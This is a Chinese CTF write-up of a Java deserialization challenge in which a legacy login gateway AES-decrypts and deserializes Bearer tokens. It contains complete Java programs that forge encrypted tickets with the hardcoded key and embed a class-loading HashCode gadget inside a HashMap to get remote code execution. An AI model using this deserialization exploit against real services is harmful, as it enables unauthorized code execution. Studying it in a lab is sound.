# Babygadget

## 题目描述：

> 某集团正在推进统一身份认证中心升级。大部分业务系统已经切换到新的身份中台，但仍有少量老 OA、审批流和财务归档模块依赖历史客户端签发的 Legacy Access Ticket。
>
> 为了保证迁移窗口内业务不中断，运维团队临时保留了一个内网兼容网关：LegacyPass 身份桥。它会接收旧 OA 客户端导出的访问票据，并尝试恢复管理员兼容会话。
>
> 你作为安全审计人员，需要审计这个兼容网关，并在授权环境中拿到 flag。

### 定位login包

![image-20260905112336405](/images/uploads/shanghai-web-04.png)

打开 jadx 里的 `Login` 类，找到 `restoreLegacySession` 方法。这段代码本质上是一条**加工流水线**，每一行对数据做一次变形：

```
输入: Authorization 头的值
 ①startsWith("Bearer ") 检查       → 不带前缀直接拒绝
 ②substring(7).trim()              → 掐掉 "Bearer " 前缀
 ③URLDecoder.decode(token,"UTF-8") → URL 解码（%2F 变 / ，%3D 变 =）
 ④Base64.getDecoder().decode(...)  → Base64 解码，得到密文字节
 ⑤Crypto.aesDecrypt(...)           → AES 解密，得到明文字节 
 ⑥new ObjectInputStream(...)       → 把明文当"Java 序列化流"解析
 ⑦readObject()                     → 引爆点
```

第 ⑥ 步之后的代码就三行读取，对着 jadx 看长什么样：

```
long accessMarker = ticketStream.readLong();     // 第 1 段：读一个长整数
String username = ticketStream.readUTF();        // 第 2 段：读一个字符串
if (accessMarker != 9143923155895290750L || !ADMIN_USERNAME.equals(username)) {
    return "Legacy ticket rejected";             // 两段不对就拒收
}
ticketStream.readObject();                       // 第 3 段：再读一个"对象"
```

所以一张合法票据 = 按同样顺序写出的三段：**一个特定的 long + 字符串 "admin" + 一个对象**。long 和字符串是“门票”，对象是我们想让它执行的东西。

`readObject()` 会把字节流**还原成活的 Java 对象**——还原过程中会执行类自己的反序列化逻辑（构造、readObject、以及后面被 HashMap 触发的 hashCode）。也就是说：**我们给它什么字节，它就在服务器内存里“活”什么对象**。

| Login.java 里的规则（读代码得到的）           | 票据要怎么造（构造请求时用的）        |
| :-------------------------------------------- | :------------------------------------ |
| 必须以 `Bearer `开头                          | 请求头写 `Authorization: Bearer xxx`  |
| 值先 `URLDecoder.decode`                      | 票据最后要做 URL 编码                 |
| 再 `Base64.decode`                            | 所以前一步要先做 Base64 **编码**      |
| 再 `Crypto.aesDecrypt`（密钥/IV/模式已知）    | 所以前一步要先做 AES **加密**         |
| 解密后 `readLong()` 要 = 9143923155895290750L | 加密前的明文**第 1 段**写这个 long    |
| `readUTF()` 要 = "admin"                      | 明文**第 2 段**写 "admin"             |
| `readObject()` 读任意对象                     | 明文**第 3 段**放我们想让它执行的东西 |

## 写 Forge.java 

```java
import java.io.*;
import java.net.URLEncoder;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Forge {
    public static void main(String[] args) throws Exception {
        // ===== 第 1 步：按服务器读取的顺序，写出三段 =====
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeLong(9143923155895290750L);   // 值来自 Login.java 的 ADMIN_ACCESS_MARKER 常量
        oos.writeUTF("admin");                 // 值来自 Login.java 的 ADMIN_USERNAME 常量
        oos.writeObject("hello");              // 第 3 段：无害对象占位，第 3 关会换掉它
        oos.close();

        // ===== 第 2 步：AES 加密（三个值全部来自 Crypto.java，Q1 你答对的）=====
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");   // Crypto.java 的 Cipher.getInstance 那行
        cipher.init(Cipher.ENCRYPT_MODE,
                new SecretKeySpec("TAKETHEAESKEY123".getBytes(), "AES"),      // AES_KEY 常量
                new IvParameterSpec("2026071620260716".getBytes()));          // AES_IV 常量
        byte[] enc = cipher.doFinal(bos.toByteArray());

        // ===== 第 3 步：Base64 + URL 编码（顺序 = 服务器处理顺序的"倒放"）=====
        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(enc), "UTF-8"));
    }
}
```

## 调用 hashCode()

![image-20260905133104882](/images/uploads/shanghai-web-09.png)

`defineClass + newInstance`（把字节码变成活的类并运行）**只存在于 `hashCode()` 这个方法**

HashMap 还原时必须重建数组，重建必须问每个 key 要哈希——`putVal(hash(key), ...)`，`hash(key)` 第一步就是 `key.hashCode()`。

```
目标：让服务器执行我们的代码
  ↑ 执行代码的机关只在 HashCode.hashCode() 方法里（出题人预埋的武器）
  ↑ 但还原 ≠ 调用，得有"人"来调 hashCode()
  ↑ 还原流程中会自动调 key.hashCode() 的 → HashMap（重建数组，源码已证）
  ↑ 所以把 HashCode 塞进 HashMap 的 key
  ↑ 把这个 HashMap 当票据第三段（替换掉 "hello"）
  ↑ 服务器 readObject() → 还原 HashMap → 自动调 hashCode() → defineClass → 代码执行
```

## 动手：Gen2.java

```java
import org.ctf.babygadget.util.HashCode;   // 题目自带的类，第 1 关你读过的那个 gadget
import java.io.*;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Gen2 {
    public static void main(String[] args) throws Exception {
        // 【新增①】args[0] = 类字节文件路径（第 3 关用 Dummy.class / junk.bin，第 4 关换成恶意类）
        byte[] payload = Files.readAllBytes(Paths.get(args[0]));

        // 【新增②】造 HashCode 对象，把类字节塞进它的私有字段 ClassByte（反射才能碰私有字段）
        HashCode hc = new HashCode();
        Field f = HashCode.class.getDeclaredField("ClassByte");
        f.setAccessible(true);
        f.set(hc, Files.readAllBytes(Paths.get("Dummy.class")));   // 先放无害字节

        // 【新增③】塞进 HashMap 当 key
        //         注意：这一行在本机就会触发 hashCode() → defineClass(Dummy) —— 无害，
        //         但它证明"put 必调 hashCode"，正是我们要利用的机制
        HashMap<HashCode, String> m = new HashMap<>();
        m.put(hc, "x");
        System.out.println("[*] local put done (hashCode triggered locally, harmless)");

        // 【新增④】put 之后再偷换字段为真载荷 —— 本地永远只碰无害字节，
        //          序列化时写进流的已经是 args[0] 的内容
        f.set(hc, payload);

        // ===== 以下和 Forge.java 完全相同，只是第三段从 "hello" 换成了 m =====
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeLong(9143923155895290750L);
        oos.writeUTF("admin");
        oos.writeObject(m);                          // ← 第三段升级
        oos.close();

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE,
                new SecretKeySpec("TAKETHEAESKEY123".getBytes(), "AES"),
                new IvParameterSpec("2026071620260716".getBytes()));
        byte[] enc = cipher.doFinal(bos.toByteArray());
        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(enc), "UTF-8"));
    }
}
```
